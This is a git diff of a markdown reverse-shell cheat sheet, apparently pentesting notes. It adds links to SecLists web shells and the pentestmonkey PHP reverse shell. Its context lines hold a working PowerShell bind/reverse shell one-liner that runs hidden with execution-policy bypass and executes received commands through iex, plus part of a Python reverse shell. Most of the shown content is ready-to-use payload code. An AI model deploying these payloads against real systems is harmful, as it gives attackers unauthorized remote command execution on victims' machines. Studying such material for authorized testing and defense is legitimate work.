@@ -16,7 +16,9 @@ Firt to get your ip, you can use the `ip` utility:
 ```
 ip addr
 ```
-To create a reverse shell payload I can recommend this [online reverse shell generator](https://www.revshells.com/), but here are some example:
+[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.
+
+To create a reverse shell payload I can recommend this [online reverse shell generator](https://www.revshells.com/), but here are some example.
 
 ## Bash Payloads
 
@@ -52,6 +54,9 @@ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.S
 ```
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 ```
+
+## PHP
+One reliable reverse shell for PHP is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell.
 
 # Msfvenom
 
